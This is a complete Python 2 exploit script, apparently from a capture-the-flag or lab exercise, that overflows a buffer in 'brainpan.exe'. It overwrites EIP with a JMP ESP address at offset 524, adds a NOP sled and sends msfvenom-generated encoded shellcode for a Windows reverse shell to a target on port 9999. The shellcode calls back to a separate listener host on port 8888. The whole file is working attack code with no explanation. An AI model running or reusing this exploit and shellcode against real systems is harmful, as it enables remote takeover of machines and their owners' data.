#!/usr/bin/python
import socket,sys,time

# Bad chars: \x00

try:
    eipOffset = 524
    print "Sending evil buffer with ",eipOffset, "bytes..."
    
    inputBuffer = "A" * eipOffset
    eip = "\xf3\x12\x17\x31"    # !mona find -s "\xFF\xE4" -m "brainpan.exe" -> 311712f3
    nopSled = "\x90" * 32
    #
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.9.69.134 LPORT=8888 EXITFUNC=thread -f python -v shellcode -e x86/shikata_ga_nai -b "\x00"
    #
    shellcode =  b""
    shellcode += b"\xbd\x41\x69\x63\x1f\xda\xca\xd9\x74\x24\xf4"
    shellcode += b"\x58\x29\xc9\xb1\x52\x31\x68\x12\x03\x68\x12"
    shellcode += b"\x83\xa9\x95\x81\xea\xd5\x8e\xc4\x15\x25\x4f"
    shellcode += b"\xa9\x9c\xc0\x7e\xe9\xfb\x81\xd1\xd9\x88\xc7"
    shellcode += b"\xdd\x92\xdd\xf3\x56\xd6\xc9\xf4\xdf\x5d\x2c"
    shellcode += b"\x3b\xdf\xce\x0c\x5a\x63\x0d\x41\xbc\x5a\xde"
    shellcode += b"\x94\xbd\x9b\x03\x54\xef\x74\x4f\xcb\x1f\xf0"
    shellcode += b"\x05\xd0\x94\x4a\x8b\x50\x49\x1a\xaa\x71\xdc"
    shellcode += b"\x10\xf5\x51\xdf\xf5\x8d\xdb\xc7\x1a\xab\x92"
    shellcode += b"\x7c\xe8\x47\x25\x54\x20\xa7\x8a\x99\x8c\x5a"
    shellcode += b"\xd2\xde\x2b\x85\xa1\x16\x48\x38\xb2\xed\x32"
    shellcode += b"\xe6\x37\xf5\x95\x6d\xef\xd1\x24\xa1\x76\x92"
    shellcode += b"\x2b\x0e\xfc\xfc\x2f\x91\xd1\x77\x4b\x1a\xd4"
    shellcode += b"\x57\xdd\x58\xf3\x73\x85\x3b\x9a\x22\x63\xed"
    shellcode += b"\xa3\x34\xcc\x52\x06\x3f\xe1\x87\x3b\x62\x6e"
    shellcode += b"\x6b\x76\x9c\x6e\xe3\x01\xef\x5c\xac\xb9\x67"
    shellcode += b"\xed\x25\x64\x70\x12\x1c\xd0\xee\xed\x9f\x21"
    shellcode += b"\x27\x2a\xcb\x71\x5f\x9b\x74\x1a\x9f\x24\xa1"
    shellcode += b"\x8d\xcf\x8a\x1a\x6e\xbf\x6a\xcb\x06\xd5\x64"
    shellcode += b"\x34\x36\xd6\xae\x5d\xdd\x2d\x39\x68\x2b\x68"
    shellcode += b"\x3f\x04\x29\x72\x1d\x6d\xa4\x94\x0b\x9d\xe1"
    shellcode += b"\x0f\xa4\x04\xa8\xdb\x55\xc8\x66\xa6\x56\x42"
    shellcode += b"\x85\x57\x18\xa3\xe0\x4b\xcd\x43\xbf\x31\x58"
    shellcode += b"\x5b\x15\x5d\x06\xce\xf2\x9d\x41\xf3\xac\xca"
    shellcode += b"\x06\xc5\xa4\x9e\xba\x7c\x1f\xbc\x46\x18\x58"
    shellcode += b"\x04\x9d\xd9\x67\x85\x50\x65\x4c\x95\xac\x66"
    shellcode += b"\xc8\xc1\x60\x31\x86\xbf\xc6\xeb\x68\x69\x91"
    shellcode += b"\x40\x23\xfd\x64\xab\xf4\x7b\x69\xe6\x82\x63"
    shellcode += b"\xd8\x5f\xd3\x9c\xd5\x37\xd3\xe5\x0b\xa8\x1c"
    shellcode += b"\x3c\x88\xc8\xfe\x94\xe5\x60\xa7\x7d\x44\xed"
    shellcode += b"\x58\xa8\x8b\x08\xdb\x58\x74\xef\xc3\x29\x71"
    shellcode += b"\xab\x43\xc2\x0b\xa4\x21\xe4\xb8\xc5\x63"
    
    buffer = inputBuffer + eip + nopSled + shellcode 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.10.251.225",9999))
    s.send(buffer)
    s.close()

except:
    print "Could not connect!"
    sys.exit()
